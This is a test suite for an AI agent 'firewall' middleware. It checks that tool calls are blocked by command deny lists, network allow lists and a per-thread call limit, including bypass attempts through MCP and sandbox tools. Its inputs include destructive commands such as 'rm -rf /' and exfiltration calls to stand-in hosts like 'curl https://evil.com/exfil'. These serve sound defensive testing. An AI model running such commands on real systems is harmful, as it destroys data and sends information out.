import { describe, it, expect, beforeEach, afterEach, mock } from "bun:test";
import { ToolMessage } from "@langchain/core/messages";
import { Command, isCommand } from "@langchain/langgraph";
import { createAgentFirewallMiddleware } from "../index";
import { loadFirewallConfig, resetFirewallConfig } from "../config";
import {
  resetThreadCallCounts,
  clearThreadCallCount,
} from "../engine";

/**
 * Build a fresh middleware against a given env, then reset env after the test.
 * The middleware reads config lazily at construction, so we control the env
 * before each call to `createAgentFirewallMiddleware`.
 */
function withEnv(
  env: Record<string, string>,
  fn: () => Promise<void> | void,
): () => Promise<void> {
  return async () => {
    const backup: Record<string, string | undefined> = {};
    for (const [k, v] of Object.entries(env)) {
      backup[k] = process.env[k];
      process.env[k] = v;
    }
    resetFirewallConfig();
    resetThreadCallCounts();
    try {
      await fn();
    } finally {
      for (const [k, v] of Object.entries(backup)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
      resetFirewallConfig();
      resetThreadCallCounts();
    }
  };
}

describe("Agent Firewall middleware", () => {
  beforeEach(() => {
    resetFirewallConfig();
    resetThreadCallCounts();
  });

  afterEach(() => {
    delete process.env.FIREWALL_COMMAND_DENY;
    delete process.env.FIREWALL_COMMAND_ALLOW;
    delete process.env.FIREWALL_NETWORK_ALLOW;
    delete process.env.FIREWALL_MAX_CALLS_PER_THREAD;
    resetFirewallConfig();
    resetThreadCallCounts();
  });

  it(
    "passes through when no firewall env vars are configured",
    withEnv({}, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ ok: true, req }));
      const request = {
        toolCall: { id: "1", name: "shell", args: { command: "rm -rf /" } },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = await mw.wrapToolCall!(request as any, handler as any) as any;
      expect(handler).toHaveBeenCalledTimes(1);
      expect(result).toEqual({ ok: true, req: request });
    }),
  );

  it(
    "blocks a denied shell command and returns a ToolMessage (never executes)",
    withEnv({ FIREWALL_COMMAND_DENY: "\\brm\\s+-rf\\b" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({
        shouldNotReach: true,
        req,
      }));
      const request = {
        toolCall: {
          id: "call-1",
          name: "shell",
          args: { command: "rm -rf /tmp" },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = (await mw.wrapToolCall!(
        request as any,
        handler as any,
      )) as ToolMessage;

      // The tool must NOT have executed.
      expect(handler).not.toHaveBeenCalled();
      // A ToolMessage reporting the block is returned to the agent.
      expect(result).toBeInstanceOf(ToolMessage);
      expect(result.name).toBe("shell");
      const content = String(result.content);
      expect(content).toContain("BLOCKED");
      expect(content).toContain("rm");
    }),
  );

  it(
    "allows a command that does not trip the denylist",
    withEnv({ FIREWALL_COMMAND_DENY: "\\brm\\s+-rf\\b" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ ran: true, req }));
      const request = {
        toolCall: {
          id: "call-2",
          name: "shell",
          args: { command: "git status" },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      await mw.wrapToolCall!(request as any, handler as any);
      expect(handler).toHaveBeenCalledTimes(1);
    }),
  );

  it(
    "blocks a non-allowlisted network host",
    withEnv({ FIREWALL_NETWORK_ALLOW: "github.com" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ ran: true, req }));
      const request = {
        toolCall: {
          id: "call-3",
          name: "fetch_url",
          args: { url: "https://evil.example.com/exfil" },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = (await mw.wrapToolCall!(
        request as any,
        handler as any,
      )) as ToolMessage;
      expect(handler).not.toHaveBeenCalled();
      expect(result).toBeInstanceOf(ToolMessage);
      expect(String(result.content)).toContain("evil.example.com");
    }),
  );

  it(
    "allows an allowlisted network host",
    withEnv(
      { FIREWALL_NETWORK_ALLOW: "github.com, *.langfuse.com" },
      async () => {
        const mw = createAgentFirewallMiddleware();
        const handler = mock(async (req: any) => ({ ran: true, req }));
        const request = {
          toolCall: {
            id: "call-4",
            name: "fetch_url",
            args: { url: "https://cloud.langfuse.com/api" },
          },
          runtime: { configurable: { thread_id: "t1" } },
        };
        await mw.wrapToolCall!(request as any, handler as any);
        expect(handler).toHaveBeenCalledTimes(1);
      },
    ),
  );

  it(
    "aborts the turn with a goto:END Command when the call ceiling is breached (no throw)",
    withEnv({ FIREWALL_MAX_CALLS_PER_THREAD: "2" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ ran: true, req }));

      // First two calls succeed.
      for (let i = 0; i < 2; i++) {
        const request = {
          toolCall: {
            id: `call-${i}`,
            name: "shell",
            args: { command: "echo hi" },
          },
          runtime: { configurable: { thread_id: "t1" } },
        };
        await mw.wrapToolCall!(request as any, handler as any);
      }
      expect(handler).toHaveBeenCalledTimes(2);

      // Third call trips the kill-switch (count was 2 after the two calls).
      // Per the langchain wrapToolCall contract (ToolMessage | Command), the
      // breach is surfaced as a Command that ends the turn rather than a throw
      // across the async boundary.
      const request = {
        toolCall: {
          id: "call-3",
          name: "shell",
          args: { command: "echo again" },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = await mw.wrapToolCall!(request as any, handler as any);
      expect(isCommand(result)).toBe(true);
      const cmd = result as Command;
      // goto: END terminates the agent loop.
      expect(cmd.goto).toEqual(["__end__"]);

      // The tool must NOT have executed on the blocked turn.
      expect(handler).toHaveBeenCalledTimes(2);
    }),
  );

  it(
    "returns a blocked ToolMessage when denylist AND allowlist both apply (deny wins)",
    withEnv(
      {
        FIREWALL_COMMAND_ALLOW: "^git\\b",
        FIREWALL_COMMAND_DENY: "\\brm\\b",
      },
      async () => {
        const mw = createAgentFirewallMiddleware();
        const handler = mock(async (req: any) => ({ ran: true, req }));
        // rm is not on the allowlist AND is on the denylist.
        const request = {
          toolCall: {
            id: "call-5",
            name: "shell",
            args: { command: "rm something" },
          },
          runtime: { configurable: { thread_id: "t1" } },
        };
        const result = (await mw.wrapToolCall!(
          request as any,
          handler as any,
        )) as ToolMessage;
        expect(handler).not.toHaveBeenCalled();
        expect(result).toBeInstanceOf(ToolMessage);
      },
    ),
  );

  it("counts each permitted call toward the per-thread ceiling", async () => {
    process.env.FIREWALL_MAX_CALLS_PER_THREAD = "3";
    resetFirewallConfig();
    const mw = createAgentFirewallMiddleware();
    const handler = mock(async (req: any) => ({ ran: true, req }));
    for (let i = 0; i < 3; i++) {
      const request = {
        toolCall: {
          id: `c${i}`,
          name: "shell",
          args: { command: "echo hi" },
        },
        runtime: { configurable: { thread_id: "counter" } },
      };
      await mw.wrapToolCall!(request as any, handler as any);
    }
    // 4th call should breach (3 calls already recorded). The breach surfaces
    // as a goto:END Command (contract-compliant), not a throw.
    const request = {
      toolCall: {
        id: "c4",
        name: "shell",
        args: { command: "echo again" },
      },
      runtime: { configurable: { thread_id: "counter" } },
    };
    const result = await mw.wrapToolCall!(request as any, handler as any);
    expect(isCommand(result)).toBe(true);
    expect((result as Command).goto).toEqual(["__end__"]);
    expect(handler).toHaveBeenCalledTimes(3);
    clearThreadCallCount("counter");
  });

  it("config is loaded once and shared (memoized)", () => {
    const a = loadFirewallConfig();
    const b = loadFirewallConfig();
    expect(b).toBe(a);
  });

  // --------------------------------------------------------------------------
  // Integration coverage for review-blocker bypasses (middleware boundary).
  // --------------------------------------------------------------------------

  it(
    "blocks a command routed through call_mcp_tool at the middleware boundary",
    withEnv({ FIREWALL_COMMAND_DENY: "\\brm\\s+-rf\\b" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ shouldNotReach: true }));
      const request = {
        toolCall: {
          id: "mcp-1",
          name: "call_mcp_tool",
          args: {
            server: "x",
            name: "shell",
            arguments: { command: "rm -rf /" },
          },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = (await mw.wrapToolCall!(
        request as any,
        handler as any,
      )) as ToolMessage;
      expect(handler).not.toHaveBeenCalled();
      expect(result).toBeInstanceOf(ToolMessage);
      expect(String(result.content)).toContain("BLOCKED");
    }),
  );

  it(
    "blocks sandbox_network egress mutation to a non-allowlisted host",
    withEnv({ FIREWALL_NETWORK_ALLOW: "github.com" }, async () => {
      const mw = createAgentFirewallMiddleware();
      const handler = mock(async (req: any) => ({ shouldNotReach: true }));
      const request = {
        toolCall: {
          id: "net-1",
          name: "sandbox_network",
          args: { rules: [{ action: "allow", target: "evil.com" }] },
        },
        runtime: { configurable: { thread_id: "t1" } },
      };
      const result = (await mw.wrapToolCall!(
        request as any,
        handler as any,
      )) as ToolMessage;
      expect(handler).not.toHaveBeenCalled();
      expect(result).toBeInstanceOf(ToolMessage);
      expect(String(result.content)).toContain("evil.com");
    }),
  );

  it(
    "blocks a command-allowed fetcher egressing to a non-allowlisted host",
    withEnv(
      {
        FIREWALL_COMMAND_ALLOW: "^curl\\b",
        FIREWALL_NETWORK_ALLOW: "github.com",
      },
      async () => {
        const mw = createAgentFirewallMiddleware();
        const handler = mock(async (req: any) => ({ shouldNotReach: true }));
        const request = {
          toolCall: {
            id: "compose-1",
            name: "sandbox_shell",
            args: { command: "curl https://evil.com/exfil" },
          },
          runtime: { configurable: { thread_id: "t1" } },
        };
        const result = (await mw.wrapToolCall!(
          request as any,
          handler as any,
        )) as ToolMessage;
        // curl is command-allowed, but evil.com is not network-allowed -> blocked.
        expect(handler).not.toHaveBeenCalled();
        expect(result).toBeInstanceOf(ToolMessage);
        expect(String(result.content)).toContain("evil.com");
      },
    ),
  );
});
